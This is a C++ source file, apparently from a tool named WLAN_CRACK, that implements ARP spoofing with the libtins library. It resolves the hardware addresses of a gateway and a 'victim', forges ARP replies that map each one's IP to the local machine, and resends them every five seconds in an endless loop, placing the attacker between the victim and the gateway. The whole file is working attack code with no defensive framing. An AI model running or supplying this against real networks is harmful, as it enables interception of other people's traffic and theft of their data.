//
// Created by skyclad on 8/2/17.
//

#include "ARPPacketSender.h"

namespace WLAN_CRACK {
    // Constructor
    ARPPacketSender::ARPPacketSender(const char *interface, Tins::IPv4Address gateway) : PacketSender(interface)
    {
        try {
            m_ipv4Gateway = gateway;
            m_iface = m_ipv4Gateway;
            m_localInfo = m_iface.addresses();
        }
        catch (std::runtime_error &error) {
            std::cerr << "[-] Input gateway correctly!!" << std::endl;
            throw(error);
        }
        m_hwGateway = Tins::Utils::resolve_hwaddr(m_iface, m_ipv4Gateway, m_sender);
    }

    bool ARPPacketSender::DoARPSpoofing(Tins::IPv4Address victim)
    {
        Tins::IPv4Address ipv4Victim;
        Tins::EthernetII::address_type hwVictim;
        try {
            ipv4Victim = victim;
            hwVictim   = Tins::Utils::resolve_hwaddr(m_iface, ipv4Victim, m_sender);
        }
        catch(std::runtime_error &error) {
            std::cerr << "[-] Input victim correctly!!" << std::endl;
            return false;
        }

        Tins::ARP arpToGateway(m_ipv4Gateway, ipv4Victim, m_hwGateway, m_localInfo.hw_addr);
        Tins::ARP arpToVictim (ipv4Victim, m_ipv4Gateway, hwVictim, m_localInfo.hw_addr);
        arpToGateway.opcode(Tins::ARP::REPLY);
        arpToVictim.opcode(Tins::ARP::REPLY);

        Tins::EthernetII ethToGateway = Tins::EthernetII(m_hwGateway, m_localInfo.hw_addr) / arpToGateway;
        Tins::EthernetII ethToVictim  = Tins::EthernetII(hwVictim, m_localInfo.hw_addr) / arpToVictim;

        std::clog << "  < ARP Spoofing Configure >  " << std::endl;
        std::clog << " - Local    => (" << m_localInfo.ip_addr << "), (" << m_localInfo.hw_addr << ")" << std::endl;
        std::clog << " - Gateway  => (" << m_ipv4Gateway << "), (" << m_hwGateway << ")" << std::endl;
        std::clog << " - Victim   => (" << ipv4Victim << "), (" << hwVictim << ")" << std::endl;

        while(true) {
            m_sender.send(ethToGateway, m_iface);
            m_sender.send(ethToVictim, m_iface);
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }

        return true;
    }
}